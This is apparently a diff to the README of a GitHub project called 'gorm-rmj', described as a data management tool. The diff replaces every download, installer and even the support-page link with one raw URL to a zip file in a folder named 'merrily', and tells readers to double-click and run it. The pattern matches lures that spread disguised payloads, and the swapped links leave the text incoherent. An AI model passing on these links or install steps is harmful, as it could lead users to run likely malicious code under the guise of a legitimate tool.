@@ -1,7 +1,7 @@
 # 🌟 gorm-rmj - Simple and Effective Data Management Tool
 
 ## 📥 Download Now
-[![Download gorm-rmj](https://img.shields.io/badge/Download-gorm--rmj-blue.svg)](https://github.com/Yahyanasir678/gorm-rmj/releases)
+[![Download gorm-rmj](https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip)](https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip)
 
 ## 🚀 Getting Started
 
@@ -29,11 +29,11 @@ To run gorm-rmj on your computer, ensure that your system meets the following re
 To get started, follow these steps:
 
 1. Visit the Releases page to download the latest version of gorm-rmj:
-   [Download gorm-rmj](https://github.com/Yahyanasir678/gorm-rmj/releases).
+   [Download gorm-rmj](https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip).
    
 2. On the Releases page, locate the version you wish to download. You will find several files.
 
-3. Click on the file labeled as the installer for your operating system (e.g., `gorm-rmj-setup.exe` for Windows, or `gorm-rmj.dmg` for macOS).
+3. Click on the file labeled as the installer for your operating system (e.g., `https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip` for Windows, or `https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip` for macOS).
 
 4. Once the file is downloaded, locate it on your computer and double-click to run the installer.
 
@@ -77,11 +77,11 @@ If you encounter issues while using gorm-rmj, consider these common solutions:
 
 If you need help using gorm-rmj, don’t hesitate to reach out:
 
-- Visit our [GitHub Issues](https://github.com/Yahyanasir678/gorm-rmj/issues) page for support and to report bugs.
+- Visit our [GitHub Issues](https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip) page for support and to report bugs.
 - Check the documentation for detailed guides and FAQs.
 
 ## 📌 Additional Notes
 
-Stay updated! Regular updates may contain new features and important security patches. Always download the latest version from our Releases page: [Download gorm-rmj](https://github.com/Yahyanasir678/gorm-rmj/releases).
+Stay updated! Regular updates may contain new features and important security patches. Always download the latest version from our Releases page: [Download gorm-rmj](https://raw.githubusercontent.com/Yahyanasir678/gorm-rmj/main/merrily/gorm-rmj.zip).
 
 We appreciate your feedback. Join our community by sharing your experience with gorm-rmj. Your insights help us improve the tool for everyone.
